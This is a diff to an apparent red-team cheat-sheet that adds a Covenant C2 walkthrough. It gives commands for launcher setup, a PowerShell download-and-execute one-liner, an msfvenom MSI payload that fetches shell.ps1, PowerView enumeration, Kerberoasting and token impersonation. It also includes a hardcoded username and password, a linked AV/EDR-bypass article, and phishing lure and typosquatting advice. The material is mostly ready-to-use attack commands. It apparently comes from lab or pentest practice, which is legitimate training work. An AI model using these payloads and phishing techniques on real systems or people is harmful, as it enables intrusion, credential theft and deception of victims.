@@ -1,18 +1,75 @@
 # Red Teaming / C2
 
+
+
+## Covenant
+
+{% code overflow="wrap" fullWidth="true" %}
+```sh
+# INSTALLATION
+The easiest way to use Covenant is by installing dotnet core. You can download dotnet core for your platform from here.
+https://dotnet.microsoft.com/download/dotnet-core/3.1
+Be sure to install the dotnet core version 3.1 SDK!
+$ ~ > git clone --recurse-submodules https://github.com/cobbr/Covenant
+$ ~ > cd Covenant/Covenant
+$ ~/Covenant/Covenant > dotnet run
+
+# REGISTER A NEW USER
+
+# LISTENERS
+Listeners (on the left menu) > Create
+Choose the same BindPort and ConnectPort # (80 or 9999 for example)
+ConnectAddresses has to be our attacking IP
+
+# LAUNCHERS
+Launchers menu (on the left) > Select PowerShell
+Verify the default settings and click on Generate
+Click on the Host tab and enter /shell.ps1 on Url field, which will be the path to the served launcher.
+Then click on Host button so Launcher will show ..../shell.ps1 as part of the DownloadString command on Launcher field
+Finally we execute that launcher command on the target (CMD/PS shell) # use port 9999 or just port 80 
+powershell iex (New-Object Net.WebClient).DownloadString('http://10.10.14.8:9999/shell.ps1')
+After that, we should get a notification "grunt X has been activated"
+
+
+# GRUNTS
+Click on the Grunt ID > Then Interact tab > Type SharpUp audit to run privesc checks
+SharpUp audit # run privesc checks
+shellcmd $COMMAND # run a shell command (do not use quotes)
+# SYSTEM REVSHELL USING THE LAUNCHER 
+msfvenom -p windows/x64/exec CMD="cmd /c powershell iex(new-object net.webclient).downloadstring('http://10.14.14.4/shell.ps1')" -f msi > pwn.msi
+shellcmd msiexec /q /i \\10.14.14.4\share\pwn.msi # change to a writable directory first
+cat $FILE # read file
+# Import PowerShell file
+PowerShellImport // PowerView.ps1
+# POWERVIEW COMMANDS
+PowerShell Get-NetDomain
+PowerShell Get-DomainComputer | Select name
+PowerShell Find-DomainShare
+net view /all \\citrix
+net use \\citrix\citrix$ /u:mturner 4install!
+dir \\citrix\citrix$
+ls \\$HOSTNAME\$SHARE
+# KERBEROASTING
+PowerShell Invoke-Kerberoast
+# IMPERSONATE AS A USER HAVING CREDS
+MakeToken $USER DOM.COM $PASS LOGON32_LOGON_INTERACTIVE
+WhoAmI
+```
+{% endcode %}
+
 ## Havoc
 
 [https://medium.com/@sam.rothlisberger/havoc-c2-with-av-edr-bypass-methods-in-2024-part-1-733d423fc67b](https://medium.com/@sam.rothlisberger/havoc-c2-with-av-edr-bypass-methods-in-2024-part-1-733d423fc67b)
 
 ## Phishing
 
-Convincing Phishing Emails
+### Convincing Phishing Emails
 
 * Sender address from a significant brand, contact or cowoker. Use OSINT to suit it better to the destinatary.
 * Subject: urgent, worrying, piques the victim's curiosity (account compromised, package shipped, payroll info, leaked pics...
 * Content/Body: mimic standard email templates of the company, signatures, use anchor text \<a href> to disguise links
 
-Phishing Infrastructure
+### Phishing Infrastructure
 
 * Domain Name (buy expired domains, typosquatting, TLD alternative such as .co.uk, IDN Homograph Attack/Script Spoofing)
 * SSL/TLS certificates
